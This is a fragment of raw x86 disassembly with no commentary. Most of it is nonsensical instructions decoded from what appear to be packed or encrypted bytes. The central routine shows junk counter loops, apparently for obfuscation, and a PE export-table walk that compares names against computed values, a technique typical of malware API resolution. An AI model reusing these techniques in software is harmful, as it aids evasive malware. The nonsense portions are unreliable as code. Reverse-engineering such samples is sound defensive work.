  40cc95:	and    esp,esp
  40cc97:	gs mov edi,eax
  40cc9a:	cmc    
  40cc9b:	pop    es
  40cc9c:	jl     0x40cd19
  40cc9e:	xor    BYTE PTR [eax-0x6b],ah
  40cca1:	pop    ss
  40cca2:	sbb    BYTE PTR [ebp-0x40f6973a],0x7f
  40cca9:	daa    
  40ccaa:	into   
  40ccab:	mov    ds:0xec10219,eax
  40ccb0:	cmovge esi,ebp
  40ccb3:	inc    ecx
  40ccb4:	cmp    al,0x85
  40ccb6:	nop
  40ccb7:	aad    0x85
  40ccb9:	es loop 0x40cd29
  40ccbc:	gs test dl,dl
  40ccbf:	push   0x9e1ad54
  40ccc4:	jns    0x40ccbd
  40ccc6:	ins    DWORD PTR es:[edi],dx
  40ccc7:	(bad)  
  40ccc8:	push   ebx
  40ccc9:	nop
  40ccca:	call   0x3750a066
  40cccf:	ds dec ecx
  40ccd1:	aaa    
  40ccd2:	fcom   DWORD PTR [esi*4-0x5671b4c3]
  40ccd9:	push   ebp
  40ccda:	aaa    
  40ccdb:	or     DWORD PTR [edx],edx
  40ccdd:	pop    es
  40ccde:	pop    eax
  40ccdf:	int    0x6d
  40cce1:	ret    
  40cce2:	cmp    al,0x21
  40cce4:	adc    bh,BYTE PTR [edi+ecx*4-0x2a776a4]
  40cceb:	pop    ds
  40ccec:	sub    DWORD PTR ds:0xb646fba3,edx
  40ccf2:	mov    gs,ebp
  40ccf4:	push   ss
  40ccf5:	cmp    ch,BYTE PTR [eax-0x4eaeb4de]
  40ccfb:	pusha  
  40ccfc:	push   ebp
  40ccfd:	sti    
  40ccfe:	add    eax,0x6ae8fc39
  40cd03:	xor    eax,0x38a35d5d
  40cd08:	cld    
  40cd09:	mov    edx,0x3426719d
  40cd0e:	push   ebp
  40cd0f:	sbb    al,ah
  40cd11:	neg    DWORD PTR [ebp+edx*1+0x31324dae]
  40cd18:	cmp    al,0xea
  40cd1a:	add    cl,dh
  40cd1c:	adc    eax,0x2c16729d
  40cd21:	jg     0x40ccdd
  40cd23:	aas    
  40cd24:	pop    ebp
  40cd25:	mov    ds:0xae304ceb,eax
  40cd2a:	pop    edi
  40cd2b:	sti    
  40cd2c:	shl    ch,1
  40cd2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd2f:	lods   eax,DWORD PTR ds:[esi]
  40cd30:	xchg   edi,eax
  40cd31:	dec    edx
  40cd32:	in     eax,0x94
  40cd34:	mov    ch,BYTE PTR [edx]
  40cd36:	into   
  40cd37:	dec    ebp
  40cd38:	inc    esp
  40cd39:	sbb    dl,dh
  40cd3b:	mov    ah,0xa5
  40cd3d:	add    ax,0xe7e
  40cd41:	cmp    BYTE PTR [esi+edx*1-0x63],ch
  40cd45:	xor    al,dl
  40cd47:	sbb    ebx,esi
  40cd49:	inc    eax
  40cd4a:	sub    eax,0xa22255b8
  40cd4f:	std    
  40cd50:	stos   BYTE PTR es:[edi],al
  40cd51:	inc    ebx
  40cd52:	test   BYTE PTR ds:0x335046c7,0x6f
  40cd59:	push   esp
  40cd5a:	fnstenv [edi]
  40cd5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd5d:	and    dh,BYTE PTR [esi+0xd]
  40cd60:	add    DWORD PTR [eax],0xfffffffd
  40cd63:	mov    WORD PTR [ecx],?
  40cd65:	sahf   
  40cd66:	and    eax,0xf2c9a286
  40cd6b:	cwde   
  40cd6c:	mov    dl,0x4d
  40cd6e:	xchg   ebp,eax
  40cd6f:	fsub   DWORD PTR [ebx+0x1b]
  40cd72:	(bad)  
  40cd73:	mov    DWORD PTR [ebx-0x79],edx
  40cd76:	clc    
  40cd77:	ins    DWORD PTR es:[edi],dx
  40cd78:	push   ebp
  40cd79:	arpl   WORD PTR [eax+eax*1+0x5b083c38],bx
  40cd80:	pop    sp
  40cd82:	test   eax,0xd249c9c6
  40cd87:	inc    ebp
  40cd88:	sti    
  40cd89:	and    esi,DWORD PTR cs:[ecx-0x1a]
  40cd8d:	jmp    0x3627:0xa0d8ab03
  40cd94:	push   ebp
  40cd95:	inc    ebp
  40cd96:	fist   WORD PTR [edi-0x56439778]
  40cd9c:	int3   
  40cd9d:	mov    edx,0xa8808bbd
  40cda2:	xor    edx,edx
  40cda4:	cdq    
  40cda5:	cli    
  40cda6:	xchg   esp,eax
  40cda7:	adc    BYTE PTR [edi],ch
  40cda9:	retf   0xe3a2
  40cdac:	test   esi,0x102faad0
  40cdb2:	lds    ecx,FWORD PTR [ebp-0x3060dfda]
  40cdb8:	pop    edi
  40cdb9:	push   ds
  40cdba:	mov    ds:0xf7c3f099,eax
  40cdbf:	cli    
  40cdc0:	outs   dx,DWORD PTR ds:[esi]
  40cdc1:	(bad)  
  40cdc2:	aam    0x7f
  40cdc4:	pop    eax
  40cdc5:	xchg   edi,eax
  40cdc6:	leave  
  40cdc7:	push   edx
  40cdc8:	in     eax,0x1a
  40cdca:	imul   esi,DWORD PTR [esi],0x86161213
  40cdd0:	cli    
  40cdd1:	pop    esi
  40cdd2:	mov    ?,esi
  40cdd4:	repz and ecx,DWORD PTR [edx+0x706af7ce]
  40cddb:	xchg   ecx,eax
  40cddc:	mov    al,BYTE PTR [ebx+0x5908a6ec]
  40cde2:	fmul   st(0),st
  40cde4:	mov    ebp,0x8fa4ecfe
  40cde9:	push   ebp
  40cdea:	pop    ebp
  40cdeb:	push   edi
  40cdec:	xchg   edx,eax
  40cded:	aad    0xef
  40cdef:	jge    0x40ce2e
  40cdf1:	adc    ecx,ebp
  40cdf3:	xchg   esp,eax
  40cdf4:	or     dh,BYTE PTR [ebx+0x5]
  40cdf7:	or     DWORD PTR [esi-0x2629154],0x2ed43637
  40ce01:	gs xchg ebx,eax
  40ce03:	ret    
  40ce04:	jae    0x40ce17
  40ce06:	test   BYTE PTR [esi+ecx*2],cl
  40ce09:	pop    ecx
  40ce0a:	inc    ecx
  40ce0b:	fs push 0xf424d5f2
  40ce11:	lods   eax,DWORD PTR es:[esi]
  40ce13:	push   ebx
  40ce14:	into   
  40ce15:	je     0x40cd98
  40ce17:	mov    eax,0x67cf162d
  40ce1c:	aaa    
  40ce1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce1e:	bound  ebp,QWORD PTR [ebx+0x5c]
  40ce21:	sbb    esi,DWORD PTR [edi]
  40ce23:	retf   
  40ce24:	(bad)  
  40ce25:	mov    ch,0x79
  40ce27:	jl     0x40cdd6
  40ce29:	push   es
  40ce2a:	push   0x39
  40ce2c:	jbe    0x40ce63
  40ce2e:	lods   eax,DWORD PTR ds:[esi]
  40ce2f:	outs   dx,BYTE PTR ds:[esi]
  40ce30:	or     al,0xf8
  40ce32:	dec    edi
  40ce33:	and    eax,0x5004f253
  40ce38:	jle    0x40ce1f
  40ce3a:	jae    0x40cea6
  40ce3c:	ins    BYTE PTR es:[edi],dx
  40ce3d:	cmp    ecx,ebp
  40ce3f:	push   ebp
  40ce40:	das    
  40ce41:	xchg   ebx,eax
  40ce42:	push   0x15ae3f71
  40ce47:	ja     0x40ce2d
  40ce49:	ds xchg ebp,eax
  40ce4b:	(bad)  
  40ce4c:	mov    ebx,0xea105d55
  40ce51:	test   DWORD PTR [esi],eax
  40ce53:	pop    edx
  40ce54:	and    bl,dh
  40ce56:	retf   0x6dab
  40ce59:	sub    BYTE PTR [esi+0x2d],0x84
  40ce5d:	push   ebx
  40ce5e:	bound  ebx,QWORD PTR [ebp-0x74e28f20]
  40ce64:	shr    BYTE PTR [ebx+0x39],0xc9
  40ce68:	aad    0x1b
  40ce6a:	mov    BYTE PTR [ebx],ch
  40ce6c:	push   ebx
  40ce6d:	rcr    BYTE PTR [ecx-0x679b7eb8],cl
  40ce73:	lock adc DWORD PTR [ebx+0x6170a5c7],ecx
  40ce7a:	sbb    DWORD PTR [ebx+ebp*4-0x2d],ebp
  40ce7e:	jl     0x40ce5c
  40ce80:	cmp    al,0x4e
  40ce82:	int3   
  40ce83:	cmp    ah,BYTE PTR [ecx+0x6d08f68d]
  40ce89:	mov    BYTE PTR [ebp-0x48],dh
  40ce8c:	jbe    0x40cebd
  40ce8e:	fwait
  40ce8f:	test   ebx,ecx
  40ce91:	aam    0x41
  40ce93:	lds    ecx,FWORD PTR [edx-0x1e3ec718]
  40ce99:	mov    eax,DWORD PTR [ebp-0x4]
  40ce9c:	mov    DWORD PTR ds:0x428eab,0x1e
  40cea6:	cmp    DWORD PTR ds:0x428eab,0x0
  40cead:	je     0x40cee0
  40ceb3:	cmp    DWORD PTR ds:0x428eab,0x2d
  40ceba:	ja     0x40cee0
  40cec0:	jmp    0x40cece
  40cec5:	push   DWORD PTR [ebp-0x24]
  40cec8:	call   DWORD PTR ds:0x42a9f3
  40cece:	mov    ebx,DWORD PTR ds:0x428eab
  40ced4:	dec    ebx
  40ced5:	mov    DWORD PTR ds:0x428eab,ebx
  40cedb:	jmp    0x40cea6
  40cee0:	xor    eax,esi
  40cee2:	add    eax,edi
  40cee4:	or     ebx,0x4a81
  40ceea:	mov    DWORD PTR [ebp-0x30],eax
  40ceed:	mov    ebx,DWORD PTR [ebp-0x4]
  40cef0:	or     eax,DWORD PTR ds:0x428e7b
  40cef6:	xor    ebx,esi
  40cef8:	and    DWORD PTR ds:0x428e6b,0x0
  40cf02:	jmp    0x40cf12
  40cf07:	mov    eax,ds:0x428e6b
  40cf0c:	inc    eax
  40cf0d:	mov    ds:0x428e6b,eax
  40cf12:	cmp    DWORD PTR ds:0x428e6b,0x19
  40cf19:	jae    0x40cf59
  40cf1f:	cmp    DWORD PTR ds:0x428e6b,0x8
  40cf26:	jl     0x40cf59
  40cf2c:	jmp    0x40cf3c
  40cf31:	push   0x428189
  40cf36:	call   DWORD PTR ds:0x42a9fb
  40cf3c:	cmp    DWORD PTR ds:0x428e6b,0x7
  40cf43:	jne    0x40cf54
  40cf49:	mov    eax,ds:0x428e6b
  40cf4e:	inc    eax
  40cf4f:	mov    ds:0x428e6b,eax
  40cf54:	jmp    0x40cf07
  40cf59:	add    ebx,edi
  40cf5b:	sub    DWORD PTR ds:0x428e8b,ebx
  40cf61:	mov    eax,DWORD PTR [ebp-0x24]
  40cf64:	xor    DWORD PTR ds:0x428ebb,0x518c
  40cf6e:	sub    eax,edi
  40cf70:	lea    ecx,[ebx-0x3272f6]
  40cf76:	xor    eax,esi
  40cf78:	xor    DWORD PTR ds:0x428e67,0x744d
  40cf82:	xor    ecx,esi
  40cf84:	mov    DWORD PTR ds:0x428eb3,0x57aa
  40cf8e:	cmp    ecx,eax
  40cf90:	mov    DWORD PTR ds:0x428e8f,0x2448
  40cf9a:	je     0x40d1fa
  40cfa0:	mov    eax,ds:0x428ebb
  40cfa5:	and    DWORD PTR ds:0x428e2f,eax
  40cfab:	mov    eax,DWORD PTR [ebp-0x4]
  40cfae:	neg    DWORD PTR ds:0x428e73
  40cfb4:	xor    eax,esi
  40cfb6:	inc    DWORD PTR ds:0x428e43
  40cfbc:	add    eax,edi
  40cfbe:	mov    DWORD PTR ds:0x428eab,0x7b11
  40cfc8:	cmp    ebx,eax
  40cfca:	jne    0x40d1d7
  40cfd0:	xor    DWORD PTR ds:0x428e37,0x428e63
  40cfda:	push   DWORD PTR [ebp+0x8]
  40cfdd:	xor    DWORD PTR ds:0x428e83,0x428eaf
  40cfe7:	call   0x421aa4
  40cfec:	or     ecx,DWORD PTR ds:0x428ecb
  40cff2:	mov    DWORD PTR [ebp-0x14],eax
  40cff5:	mov    eax,DWORD PTR [ebp-0x4]
  40cff8:	and    DWORD PTR ds:0x428e97,0x0
  40d002:	mov    ecx,DWORD PTR ds:0x428e97
  40d008:	inc    ecx
  40d009:	mov    DWORD PTR ds:0x428e97,ecx
  40d00f:	cmp    DWORD PTR ds:0x428e97,0x8
  40d016:	jg     0x40d055
  40d01c:	jmp    0x40d02c
  40d021:	push   0x2d20
  40d026:	call   DWORD PTR ds:0x42a9ff
  40d02c:	cmp    DWORD PTR ds:0x428e97,0x7
  40d033:	jne    0x40d048
  40d039:	xor    ecx,ecx
  40d03b:	xor    ecx,DWORD PTR ds:0x428e97
  40d041:	inc    ecx
  40d042:	mov    DWORD PTR ds:0x428e97,ecx
  40d048:	cmp    DWORD PTR ds:0x428e97,0x16
  40d04f:	jb     0x40d002
  40d055:	mov    ecx,DWORD PTR [ebp-0x14]
  40d058:	xor    eax,esi
  40d05a:	sbb    DWORD PTR ds:0x428e33,0x7710
  40d064:	add    eax,edi
  40d066:	cmp    ecx,eax
  40d068:	mov    DWORD PTR ds:0x428e93,0x6f23
  40d072:	je     0x40f614
  40d078:	push   DWORD PTR [ebp-0x14]
  40d07b:	xor    DWORD PTR ds:0x428e33,0x5f29
  40d085:	push   DWORD PTR [ebp+0x8]
  40d088:	call   0x423e95
  40d08d:	mov    DWORD PTR [ebp-0x14],eax
  40d090:	mov    eax,DWORD PTR [ebp-0x4]
  40d093:	mov    ecx,DWORD PTR ds:0x428e93
  40d099:	and    DWORD PTR ds:0x428e8b,ecx
  40d09f:	mov    ecx,DWORD PTR [ebp-0x14]
  40d0a2:	neg    DWORD PTR ds:0x428e6b
  40d0a8:	xor    eax,esi
  40d0aa:	sub    DWORD PTR ds:0x428e8b,0x59e8
  40d0b4:	add    eax,edi
  40d0b6:	cmp    ecx,eax
  40d0b8:	je     0x40f614
  40d0be:	and    DWORD PTR ds:0x428e63,0x0
  40d0c8:	jmp    0x40d0da
  40d0cd:	mov    ecx,DWORD PTR ds:0x428e63
  40d0d3:	inc    ecx
  40d0d4:	mov    DWORD PTR ds:0x428e63,ecx
  40d0da:	cmp    DWORD PTR ds:0x428e63,0x14
  40d0e1:	jae    0x40d123
  40d0e7:	cmp    DWORD PTR ds:0x428e63,0xb
  40d0ee:	jbe    0x40d123
  40d0f4:	jmp    0x40d104
  40d0f9:	push   0x4280f7
  40d0fe:	call   DWORD PTR ds:0x42aa03
  40d104:	cmp    DWORD PTR ds:0x428e63,0xa
  40d10b:	jne    0x40d11e
  40d111:	mov    ecx,DWORD PTR ds:0x428e63
  40d117:	inc    ecx
  40d118:	mov    DWORD PTR ds:0x428e63,ecx
  40d11e:	jmp    0x40d0cd
  40d123:	mov    eax,DWORD PTR [ebp-0x14]
  40d126:	mov    eax,DWORD PTR [eax+0x18]
  40d129:	mov    DWORD PTR [ebp-0x24],eax
  40d12c:	or     ecx,0x560
  40d132:	mov    eax,DWORD PTR [ebp-0x14]
  40d135:	adc    ecx,DWORD PTR ds:0x428e9f
  40d13b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d13e:	add    ecx,DWORD PTR [eax+0x20]
  40d141:	xor    eax,eax
  40d143:	xor    eax,DWORD PTR ds:0x428e7b
  40d149:	sbb    eax,DWORD PTR ds:0x428e67
  40d14f:	mov    ds:0x428e7b,eax
  40d154:	mov    DWORD PTR [ebp-0x2c],ecx
  40d157:	dec    ecx
  40d158:	mov    eax,DWORD PTR [ebp-0x14]
  40d15b:	add    ecx,0x1e8d
  40d161:	mov    ecx,DWORD PTR [ebp+0x8]
  40d164:	add    ecx,DWORD PTR [eax+0x24]
  40d167:	and    DWORD PTR ds:0x428e3b,0x0
  40d171:	mov    eax,ds:0x428e3b
  40d176:	inc    eax
  40d177:	mov    ds:0x428e3b,eax
  40d17c:	cmp    DWORD PTR ds:0x428e3b,0x2c
  40d183:	ja     0x40d1a4
  40d189:	jmp    0x40d197
  40d18e:	push   DWORD PTR [ebp-0x14]
  40d191:	call   DWORD PTR ds:0x42aa07
  40d197:	cmp    DWORD PTR ds:0x428e3b,0x1f
  40d19e:	jb     0x40d171
  40d1a4:	mov    DWORD PTR [ebp-0x34],ecx
  40d1a7:	mov    eax,ds:0x428e3b
  40d1ac:	and    DWORD PTR ds:0x428e87,eax
  40d1b2:	mov    eax,DWORD PTR [ebp-0x14]
  40d1b5:	xor    DWORD PTR ds:0x428e73,0x264d
  40d1bf:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1c2:	add    ecx,DWORD PTR [eax+0x1c]
  40d1c5:	mov    DWORD PTR ds:0x428e57,0x2595
  40d1cf:	mov    DWORD PTR [ebp-0x14],ecx
  40d1d2:	jmp    0x40f5dc
  40d1d7:	mov    eax,DWORD PTR [ebp-0x2c]
  40d1da:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1dd:	add    ecx,DWORD PTR [eax+ebx*4]
  40d1e0:	mov    DWORD PTR [ebp-0x28],ecx
  40d1e3:	mov    eax,DWORD PTR [ebp-0x4]
  40d1e6:	mov    ecx,DWORD PTR [ebp-0x28]
  40d1e9:	xor    eax,esi
  40d1eb:	add    eax,edi
  40d1ed:	cmp    ecx,eax
  40d1ef:	je     0x40f5dc
  40d1f5:	jmp    0x40f5cd
  40d1fa:	mov    eax,DWORD PTR [ebp-0x4]
  40d1fd:	mov    ecx,DWORD PTR [ebp-0x8]
  40d200:	xor    eax,esi
  40d202:	add    eax,edi
  40d204:	jmp    0x40f5b3
  40d209:	jns    0x40d251
  40d20b:	mov    esp,0x14898cd9
  40d210:	(bad)  
  40d211:	mov    es,WORD PTR [eax+0x504c1153]
  40d217:	sub    eax,0x83d25504
  40d21c:	xor    ecx,0x60
  40d21f:	add    DWORD PTR [ebx-0x4a6e2b81],0x4f
  40d226:	std    
  40d227:	cmc    
  40d228:	jbe    0x40d29a
  40d22a:	push   esp
  40d22b:	mov    eax,ds:0x2c0f7f6a
  40d230:	inc    ebp
  40d231:	mov    eax,ds:0x3e0166bd
  40d236:	test   al,0x1e
  40d238:	xchg   edi,eax
  40d239:	adc    eax,0xc60a69b5
  40d23e:	test   eax,0xeb5f36f
  40d243:	xor    eax,0x13ef5f59
  40d248:	fimul  WORD PTR [edx]
  40d24a:	sahf   
  40d24b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d24c:	retf   0xb97
  40d24f:	xchg   DWORD PTR [eax],edi
  40d251:	sbb    ebx,edx
  40d253:	test   BYTE PTR gs:[eax],bh
  40d256:	repz and al,0xdc
  40d259:	(bad)  
  40d25a:	fbld   TBYTE PTR [ebp+0x6aa34ff0]
  40d260:	pop    ds
  40d261:	scas   eax,DWORD PTR es:[edi]
  40d262:	mov    bl,0xf5
  40d264:	cmp    BYTE PTR [esi-0x1534ab12],ah
  40d26a:	cdq    
  40d26b:	icebp  
  40d26c:	cmp    ebp,DWORD PTR [esi]
  40d26e:	dec    ecx
  40d26f:	aas    
  40d270:	sbb    eax,0xa5e8126f
  40d275:	adc    eax,0x4399cfab
  40d27a:	jge    0x40d23d
  40d27c:	xor    BYTE PTR [eax-0x7c],al
  40d27f:	push   esp
  40d280:	in     eax,dx
  40d281:	lea    esi,[eax+0xf6a834]
  40d287:	xchg   ebx,eax
  40d288:	arpl   WORD PTR [ebp-0x17a41c00],di
  40d28e:	inc    ebx
  40d28f:	cld    
  40d290:	std    
  40d291:	dec    ebp
  40d292:	dec    ebx
  40d293:	sub    eax,0xc300049c
  40d298:	div    DWORD PTR [ecx+0x72]
  40d29b:	mov    dl,0xbb
  40d29d:	sahf   
  40d29e:	mov    bh,0x7d
  40d2a0:	add    BYTE PTR [ecx+0x16],ch
  40d2a3:	and    eax,0x5e7c1002
  40d2a8:	adc    al,0xb8
  40d2aa:	stos   BYTE PTR es:[edi],al
  40d2ab:	jge    0x40d276
  40d2ad:	adc    DWORD PTR [eax+0x2763c405],esi
  40d2b3:	push   ecx
  40d2b4:	dec    ebx
  40d2b5:	xchg   esp,eax
  40d2b6:	les    esp,FWORD PTR [ebp-0x6218954c]
  40d2bc:	into   
  40d2bd:	out    0x2b,al
  40d2bf:	ret    0x82a9
  40d2c2:	inc    esp
  40d2c3:	adc    al,0x50
  40d2c5:	sbb    ch,dl
  40d2c7:	pop    ds
  40d2c8:	push   esp
  40d2c9:	mov    ebp,0x9ac63efe
  40d2ce:	out    0x57,eax
  40d2d0:	mov    ecx,0x734bbcf4
  40d2d5:	xchg   DWORD PTR [ecx+0x4d62b9ac],esi
  40d2db:	xchg   edx,eax
  40d2dc:	sub    BYTE PTR [ecx],bl
  40d2de:	in     eax,dx
  40d2df:	push   es
  40d2e0:	call   edx
  40d2e2:	or     cl,BYTE PTR [ebx-0x7d205cea]
  40d2e8:	iret   
  40d2e9:	xchg   edx,eax
  40d2ea:	push   esi
  40d2eb:	xor    eax,0x944cafda
  40d2f0:	lea    eax,[ebx]
  40d2f2:	retf   0x42e2
  40d2f5:	out    dx,al
  40d2f6:	(bad)  
  40d2f7:	sti    
  40d2f8:	loope  0x40d2cf
  40d2fa:	push   ecx
  40d2fb:	and    al,BYTE PTR [esi+0x11]
  40d2fe:	call   FWORD PTR [ebx]
  40d300:	lods   al,BYTE PTR ds:[esi]
  40d301:	xchg   ebp,eax
  40d302:	adc    ebp,eax
  40d304:	dec    eax
  40d305:	mov    ds:0x5a3c0bf1,al
  40d30a:	mov    esi,0x1b0b029a
  40d30f:	dec    edi
  40d310:	test   al,0xea
  40d312:	sub    ch,BYTE PTR [ecx+edi*4+0xed06cbb]
  40d319:	out    0x7c,al
  40d31b:	mov    esi,ss
  40d31d:	pop    eax
  40d31e:	in     eax,0xe5
  40d320:	add    eax,0xfe749bb4
  40d325:	data16 gs fdivr st(3),st
  40d329:	inc    esp
  40d32a:	sbb    bh,dh
  40d32c:	push   esi
  40d32d:	dec    eax
  40d32e:	and    al,0x5f
  40d330:	push   ds
  40d331:	add    al,0x2c
  40d333:	cmp    DWORD PTR [eax+0x79],ecx
  40d336:	iret   
  40d337:	fistp  DWORD PTR [edx]
  40d339:	outs   dx,BYTE PTR ds:[esi]
  40d33a:	scas   eax,DWORD PTR es:[edi]
  40d33b:	dec    ecx
  40d33c:	pop    ss
  40d33d:	ins    DWORD PTR es:[edi],dx
  40d33e:	xchg   esp,eax
  40d33f:	ficomp DWORD PTR [esp+ebx*1]
  40d342:	out    dx,al
  40d343:	or     DWORD PTR [ebp*8+0x7fa0d965],0xffffff98
  40d34b:	in     eax,dx
  40d34c:	xchg   esi,eax
  40d34d:	push   0x377af06
  40d352:	lock ds pop ecx
  40d355:	imul   edx,ebx,0x12cd816b
  40d35b:	mov    dh,dl
  40d35d:	jbe    0x40d393
  40d35f:	mov    ebx,0x825fb100
  40d364:	xchg   ecx,eax
  40d365:	retf   
  40d366:	nop
  40d367:	(bad)  
  40d368:	das    
  40d369:	fcom   st(6)
  40d36b:	dec    ecx
  40d36c:	sub    al,BYTE PTR [ecx-0x44c62465]
  40d372:	xchg   ebx,eax
  40d373:	pusha  
  40d374:	fcom   QWORD PTR [ebx-0x652f34c9]
  40d37a:	inc    esp
  40d37b:	pop    es
  40d37c:	nop
  40d37d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d37e:	js     0x40d325
  40d380:	push   esp
  40d381:	pop    edi
  40d382:	sbb    esi,ebp
  40d384:	mov    esp,0xd00bb74b
  40d389:	xchg   ecx,eax
  40d38a:	fwait
  40d38b:	or     al,0x7c
  40d38d:	jp     0x40d3c6
  40d38f:	lds    ecx,FWORD PTR [edi+ebx*4-0x61]
  40d393:	loop   0x40d39f
  40d395:	jns    0x40d31e
  40d397:	sar    BYTE PTR [ebx],0x63
  40d39a:	push   cs
  40d39b:	push   ebx
  40d39c:	xchg   esp,eax
  40d39d:	cdq    
  40d39e:	ss das 
  40d3a0:	ret    
  40d3a1:	fs mov ebx,0xaa1b814d
  40d3a7:	fisttp QWORD PTR [ecx-0x550966b]
  40d3ad:	out    dx,al
  40d3ae:	and    ebp,ecx
  40d3b0:	or     eax,0xf2b49666
  40d3b5:	(bad)  
  40d3b7:	sub    al,0x31
  40d3b9:	test   DWORD PTR [esi-0x3f],ebp
  40d3bc:	stos   BYTE PTR es:[edi],al
  40d3bd:	inc    edi
  40d3be:	sub    eax,0x27793af5
  40d3c3:	stc    
  40d3c4:	in     al,0xc9
  40d3c6:	jae    0x40d395
  40d3c8:	push   esi
  40d3c9:	jg     0x40d3f1
  40d3cb:	es std 
  40d3cd:	xor    ebp,edx
  40d3cf:	mov    al,0x38
  40d3d1:	xor    al,0xe6
  40d3d3:	mov    gs,ebp
  40d3d5:	mov    ds:0xb0f31122,al
  40d3da:	cmp    dl,BYTE PTR [ecx*2+0x23870c6d]
  40d3e1:	loopne 0x40d382
  40d3e3:	push   esi
  40d3e4:	jo     0x40d3ac
  40d3e6:	cmp    dl,BYTE PTR [esi-0x58]
  40d3e9:	adc    eax,0x6a53794a
  40d3ee:	sbb    DWORD PTR [edi-0x67],esi
  40d3f1:	gs int 0x9f
  40d3f4:	bound  esp,QWORD PTR [edx-0x36]
  40d3f7:	fisub  DWORD PTR [edi]
  40d3f9:	ror    DWORD PTR [esp+edi*1-0x2b90bcec],1
  40d400:	sub    al,0x2d
  40d402:	mov    ch,0x96
  40d404:	xor    dh,BYTE PTR ds:0xac982b79
  40d40a:	stos   DWORD PTR es:[edi],eax
  40d40b:	jg     0x40d3fc
  40d40d:	test   DWORD PTR ds:0xc56c5907,edx
  40d413:	adc    dl,BYTE PTR [eax+0x23]
  40d416:	imul   ebx,DWORD PTR [ecx-0x56c437dd],0xd6df3353
  40d420:	push   ebx
  40d421:	(bad)  
  40d422:	scas   eax,DWORD PTR es:[edi]
  40d423:	je     0x40d3fa
  40d425:	xchg   ebp,eax
  40d426:	pop    eax
  40d427:	pop    eax
  40d428:	loope  0x40d46e
  40d42a:	pop    eax
  40d42b:	outs   dx,BYTE PTR ds:[esi]
  40d42c:	arpl   WORD PTR [ebx],sp
  40d42e:	sbb    cl,BYTE PTR ds:0x93901192
  40d434:	xchg   BYTE PTR [esi],cl
  40d436:	js     0x40d454
  40d438:	lahf   
  40d439:	xchg   esi,eax
  40d43a:	pop    ss
  40d43b:	jl     0x40d42c
  40d43d:	cdq    
  40d43e:	arpl   WORD PTR [ecx+0x2f],sp
  40d441:	jmp    0x6cc4:0x2d39e64d
  40d448:	aad    0x37
  40d44a:	rol    BYTE PTR [eax-0x3f475593],0x24
  40d451:	mov    ebp,edx
  40d453:	std    
  40d454:	fdiv   QWORD PTR [ebp+0x45e76fe3]
  40d45a:	sub    DWORD PTR [ecx],ecx
  40d45c:	out    dx,al
  40d45d:	int3   
  40d45e:	cmp    bl,BYTE PTR [edi]
  40d460:	mov    fs,WORD PTR [ebp+0x3f]
  40d463:	cmp    BYTE PTR [ebx],bl
  40d465:	mov    ah,0x5
  40d467:	add    al,0x29
  40d469:	sbb    DWORD PTR [edi],esi
  40d46b:	xor    al,0x66
  40d46d:	sbb    ch,cl
  40d46f:	ror    BYTE PTR [edi+0x612e4c97],0xdc
  40d476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d477:	lods   al,BYTE PTR ds:[esi]
  40d478:	lods   eax,DWORD PTR ds:[esi]
  40d479:	pop    ebp
  40d47a:	mov    BYTE PTR [esi-0x252b991],ch
  40d480:	or     edx,ebp
  40d482:	pop    esi
  40d483:	fbld   TBYTE PTR [eax]
  40d485:	ret    0xbf76
  40d488:	pop    esp
  40d489:	cdq    
  40d48a:	mov    ds:0x349b5e7c,al
  40d48f:	shr    BYTE PTR [edx-0x1e],cl
  40d492:	das    
  40d493:	mov    ch,0xcc
  40d495:	outs   dx,DWORD PTR ds:[esi]
  40d496:	jo     0x40d4cd
  40d498:	push   edi
  40d499:	cli    
  40d49a:	mov    ebx,0x45dc4b2d
  40d49f:	sub    ebp,DWORD PTR [ecx-0x5c35d30]
  40d4a5:	nop
  40d4a6:	je     0x40d4fc
  40d4a8:	jno    0x40d518
  40d4aa:	iret   
  40d4ab:	xor    eax,edx
  40d4ad:	fwait
  40d4ae:	or     ebx,esp
  40d4b0:	sub    al,0xf4
  40d4b2:	and    esp,esi
  40d4b4:	adc    BYTE PTR [eax],cl
  40d4b6:	stos   DWORD PTR es:[edi],eax
  40d4b7:	jle    0x40d4b9
  40d4b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4ba:	jmp    0x40d505
  40d4bc:	push   edx
  40d4bd:	sub    bh,ch
  40d4bf:	sub    al,0x71
  40d4c1:	cmc    
  40d4c2:	(bad)  [esi-0x80]
  40d4c5:	cmp    BYTE PTR [esi-0x46],dl
  40d4c8:	adc    bh,bh
  40d4ca:	popf   
  40d4cb:	jae    0x40d50d
  40d4cd:	sbb    eax,0x28613634
  40d4d2:	add    dh,BYTE PTR [ecx+ebx*4-0x23eae5fc]
  40d4d9:	xor    al,0xd4
  40d4db:	mov    edx,0x46d73058
  40d4e0:	adc    DWORD PTR [ebp+0x41dc8f6],eax
  40d4e6:	or     DWORD PTR [edx-0x2cb6fad6],0x31c43f54
  40d4f0:	fisub  WORD PTR [edi]
  40d4f2:	std    
  40d4f3:	pop    ecx
  40d4f4:	fimul  DWORD PTR [edx+0x5b2b272f]
  40d4fa:	ret    
  40d4fb:	jns    0x40d4cb
  40d4fd:	lods   al,BYTE PTR ds:[esi]
  40d4fe:	sbb    bh,BYTE PTR [edx+ebx*8]
  40d501:	fucom  st(6)
  40d503:	add    DWORD PTR [ebp-0x8],esi
  40d506:	xor    DWORD PTR [edi+0x5a],ebx
  40d509:	or     BYTE PTR [edi],dh
  40d50b:	jbe    0x40d4fc
  40d50d:	jns    0x40d551
  40d50f:	cmp    BYTE PTR [ebp+0x4c],0x7c
  40d513:	and    al,0x80
  40d515:	hlt    
  40d516:	xchg   ecx,eax
  40d517:	adc    bl,BYTE PTR [edi]
  40d519:	pop    ss
  40d51a:	fnstcw WORD PTR ds:[edx]
  40d51d:	mov    ecx,0xc6007beb
  40d522:	push   esp
  40d523:	adc    eax,0xb8a42370
  40d528:	pop    ss
  40d529:	sti    
  40d52a:	jmp    0x1a2c7118
  40d52f:	or     al,bl
  40d531:	mov    ecx,0x383f0784
  40d536:	inc    esi
  40d537:	pop    edi
